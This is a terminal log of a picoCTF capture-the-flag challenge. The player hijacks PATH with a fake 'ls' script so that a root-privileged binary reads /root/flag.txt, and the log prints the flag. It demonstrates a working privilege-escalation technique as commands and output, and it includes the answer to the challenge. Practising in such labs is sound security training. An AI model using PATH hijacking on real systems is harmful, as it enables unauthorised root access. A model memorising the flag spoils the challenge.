

ctf-player@pico-chall$ bash
ctf-player@challenge:~$ ls
bin
ctf-player@challenge:~$ ./bin 
Error: SECRET_DIR environment variable is not set
ctf-player@challenge:~$ exit
exit
ctf-player@pico-chall$ ./bin 
Error: SECRET_DIR environment variable is not set
ctf-player@pico-chall$ bash
ctf-player@challenge:~$ echo '#!/bin/bash' > ~/ls
ctf-player@challenge:~$ echo 'cat "$1"' >> ~/ls
ctf-player@challenge:~$ chmod +x ~/ls
ctf-player@challenge:~$ SECRET_DIR=~/ls
ctf-player@challenge:~$ ./bin
Error: SECRET_DIR environment variable is not set
ctf-player@challenge:~$ SECRET_DIR=~/ls ./bin
Listing the content of /home/ctf-player/ls as root: 
/home/ctf-player/ls
ctf-player@challenge:~$ SECRET_DIR=/root ./bin
Listing the content of /root as root: 
flag.txt
ctf-player@challenge:~$ PATH=~/:$PATH SECRET_DIR=/root ./bin
Listing the content of /root as root: 
cat: /root: Is a directory
Error: system() call returned non-zero value: 256
ctf-player@challenge:~$ echo '#!/bin/bash' > ~/ls
ctf-player@challenge:~$ echo 'cat "/root/flag.txt"' >> ~/ls
ctf-player@challenge:~$ PATH=~/:$PATH SECRET_DIR=/root ./bin
Listing the content of /root as root: 
picoCTF{Power_t0_man!pul4t3_3nv_1ac0e5a3}ctf-player@challenge:~$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.